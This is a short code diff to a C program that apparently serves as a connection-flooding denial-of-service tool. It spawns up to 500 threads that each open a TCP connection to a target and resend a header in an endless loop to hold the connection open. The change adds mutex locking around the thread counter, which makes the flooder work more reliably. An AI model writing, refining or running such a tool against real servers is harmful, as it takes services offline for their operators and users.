@@ -10,6 +10,7 @@
 #define MAX_T 500
 
 unsigned short n_threads= 0;
+pthread_mutex_t mutex;
 
 typedef struct {
 	struct sockaddr_in addr;
@@ -24,26 +25,34 @@ void *tredi(void *args){
 	int ls;
 	if((ls = socket(AF_INET, SOCK_STREAM, 0)) == -1){
 		perror("socket()");	
+		pthread_mutex_lock(&mutex);
 		n_threads--;
+		pthread_mutex_unlock(&mutex);
 		pthread_exit(NULL);
 	}
 
 	if(connect(ls, (struct sockaddr*)&args_t.addr, sizeof(args_t.addr)) == -1) {
 		perror("connect()");
+		pthread_mutex_lock(&mutex);
 		n_threads--;
+		pthread_mutex_unlock(&mutex);
 		pthread_exit(NULL);
 	}
 
 	if(send(ls, header, strlen(header), 0) == -1){
 		perror("send()");
+		pthread_mutex_lock(&mutex);
 		n_threads--;
+		pthread_mutex_unlock(&mutex);
 		pthread_exit(NULL);
 	}
 
 	while(1){
 		if(send(ls, header, strlen(header), 0) == -1){
 			perror("send()");
+			pthread_mutex_lock(&mutex);
 			n_threads--;
+			pthread_mutex_unlock(&mutex);
 			pthread_exit(NULL);
 		}
 		sleep(TIMEOUT);
@@ -65,7 +74,9 @@ int main(int argc, char *argv[]){
 	while(1){
 		if(n_threads < 500){
 			pthread_create(&a, NULL, tredi, (void*)&arg);
+			pthread_mutex_lock(&mutex);
 			n_threads++;
+			pthread_mutex_unlock(&mutex);
 		}
 	}
 
